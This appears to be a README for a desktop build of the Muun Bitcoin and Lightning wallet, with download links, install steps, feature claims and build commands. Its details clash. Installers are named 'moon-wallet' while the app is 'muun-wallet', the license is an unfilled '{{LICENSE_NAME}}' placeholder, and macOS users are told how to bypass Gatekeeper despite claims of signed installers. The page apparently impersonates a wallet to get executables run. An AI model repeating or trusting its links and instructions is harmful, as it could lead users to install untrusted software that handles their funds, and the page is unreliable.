# Muun Wallet

**Non-custodial Bitcoin and Lightning Network wallet for Windows, macOS, and Linux**

[![Download for Windows](https://img.shields.io/badge/download-Windows%20x64-0078d4?style=flat-square&logo=windows)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Download for macOS](https://img.shields.io/badge/download-macOS-000000?style=flat-square&logo=apple)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Download for Linux](https://img.shields.io/badge/download-Linux-FCC624?style=flat-square&logo=linux)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Website](https://img.shields.io/badge/website-muun--wallet.com-blue?style=flat-square)](https://muun-wallet.com)

---

## About Muun Wallet

Muun Wallet is a **self-custody Bitcoin and Lightning Network wallet** that prioritizes ease of use without sacrificing security. Your keys are generated and stored locally â€” nothing is held on our servers. No account, email, or signup is required.

For complete guides, installation instructions, and comparisons with other wallets, see the [Muun Wallet documentation](https://github.com/muun-network/muun-wallet-docs).

---

## Downloads

| Platform | File | Download |
|----------|------|----------|
| **Windows 10 / 11** | moon-wallet-v0.5.1.exe | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) |
| **macOS 10.15+** | moon-wallet-v0.5.1.dmg | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) |
| **Linux** | moon-wallet-v0.5.1.zip | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) |

**All installers are cryptographically signed by MUUN ApS.** [Verify your download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)

---

## Installation

### Windows

1. Download the `.exe` file from the link above.
2. Run the installer and follow the on-screen prompts.
3. Launch Muun Wallet from your Start menu.

No special permissions required â€” standard app installation.

### macOS

1. Download the `.dmg` file from the link above.
2. Open the disk image and drag **Muun Wallet** to the **Applications** folder.
3. Launch Muun Wallet from Applications.

**Gatekeeper notice:** On first launch, macOS may block the app if it's the first time you're running it. Right-click the app, select **Open**, and confirm. On subsequent launches, it will open normally.

### Linux

1. Download the `.zip` file from the link above.
2. Extract the archive to a directory of your choice:
   ```bash
   unzip moon-wallet-v0.5.1.zip -d ~/muun-wallet
   cd ~/muun-wallet
   ```
3. Make the binary executable:
   ```bash
   chmod +x muun-wallet
   ```
4. Run Muun Wallet:
   ```bash
   ./muun-wallet
   ```

**Package managers:** Muun Wallet is available in package managers for some distributions. Check your distribution's repositories if you prefer installation via package manager.

---

## Features

- **Non-custodial:** Your keys are generated and stored locally. We never hold your funds.
- **Lightning Network:** Send and receive payments on-chain or on Lightning with real-time fee comparisons.
- **Emergency Kit:** A unique backup system that's more intuitive than 12-word recovery seed phrases.
- **No signup required:** Install, create a wallet, and start using â€” no email or account needed.
- **Open source:** Review the code at [github.com/muun-network](https://github.com/muun-network). Transparency builds trust.
- **Fee transparency:** See the real cost of your transaction before you send it.
- **Signed installers:** Every release is cryptographically signed so your OS can verify you downloaded a legitimate copy.

---

## Getting Started

**First time with Muun?** Follow these steps:

1. [Install Muun Wallet](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/getting-started-installation-windows.md) for your platform.
2. [Create your Emergency Kit backup immediately.](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/emergency-kit-backup-system.md) This is your recovery method.
3. [Send and receive your first transaction.](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/getting-started-first-transaction.md)

---

## Guides & Documentation

**Start here:**
- [Installation & setup by platform](https://github.com/muun-network/muun-wallet-docs#getting-started)
- [Emergency Kit backup & recovery](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/emergency-kit-backup-system.md)
- [Security best practices](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/security-checklist-best-practices.md)

**Fees & Payments:**
- [Understanding fees: on-chain vs Lightning](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/fee-structure-on-chain-lightning.md)
- [Sending Bitcoin with Muun](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/sending-bitcoin-step-by-step-guide.md)
- [Receiving payments on Lightning](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-lightning-address-receiving.md)

**Comparisons:**
- [Muun vs Electrum](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-electrum-comparison.md)
- [Muun vs Sparrow](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-sparrow-comparison.md)
- [Muun vs Phoenix](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-phoenix-comparison.md)
- [All documentation â†’](https://github.com/muun-network/muun-wallet-docs)

---

## Security

**Your security is your responsibility.** Muun Wallet is designed to make self-custody easier, but you must understand the risks:

- **No account recovery:** If you lose your Emergency Kit, you cannot recover your wallet through us. Back it up securely.
- **Self-custody means full responsibility:** Your funds are as secure as your backup and your device's security.
- **Verify before trusting:** Before installing, verify the installer checksum and, if you're technical, review the source code.

[Read our full security guide â†’](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/security-checklist-best-practices.md)

---

## Website & Support

**Muun Wallet is published by MUUN ApS at https://muun-wallet.com/**

- [Muun Wallet website](https://muun-wallet.com)
- [Download with checksums](https://muun-wallet.com/download)
- [Security guides](https://muun-wallet.com/guides/backup-recovery)
- [Features overview](https://muun-wallet.com/desktop-features)
- [FAQ](https://muun-wallet.com/faq)
- [Latest updates](https://muun-wallet.com/updates)

---

## Development

**Prerequisites:**

- Node.js 16+
- npm or yarn

**Clone and install:**

```bash
git clone https://github.com/muun-network/muun-wallet.git
cd muun-wallet
npm install
```

**Run locally:**

```bash
npm start
```

**Build for your platform:**

```bash
# Windows
npm run build:win

# macOS
npm run build:mac

# Linux
npm run build:linux
```

**Code quality:**

```bash
# Lint
npm run lint

# Format
npm run format

# Tests
npm test
```

---

## Stack

- **[Electron](https://www.electronjs.org/)** â€” Cross-platform desktop application framework
- **[Bitcoin.js](https://github.com/bitcoinjs/bitcoinjs-lib)** â€” Bitcoin cryptography and utilities
- **[LDK (Lightning Dev Kit)](https://github.com/lightningdevkit/rust-lightning)** â€” Lightning Network protocol
- **[React](https://react.dev/)** â€” User interface
- **[TypeScript](https://www.typescriptlang.org/)** â€” Type-safe JavaScript

---

## Support & Issues

- **Documentation:** [github.com/muun-network/muun-wallet-docs](https://github.com/muun-network/muun-wallet-docs)
- **Report a bug:** [github.com/muun-network/muun-wallet/issues](https://github.com/muun-network/muun-wallet/issues)
- **Website:** [muun-wallet.com](https://muun-wallet.com)

---

## License

{{LICENSE_NAME}} â€” See the [LICENSE](LICENSE) file for full details.

This software is provided as-is. Use at your own risk.

---

**Muun Wallet by MUUN ApS**  
[Download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) | [Guides â†’](https://github.com/muun-network/muun-wallet-docs) | [Website â†’](https://muun-wallet.com)
